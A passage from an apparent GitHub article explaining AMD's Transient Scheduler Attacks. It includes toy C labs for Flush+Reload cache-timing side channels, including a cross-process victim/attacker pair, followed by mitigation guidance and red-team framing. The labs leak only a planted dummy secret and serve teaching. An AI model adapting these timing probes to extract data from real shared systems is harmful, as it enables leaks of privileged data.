    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
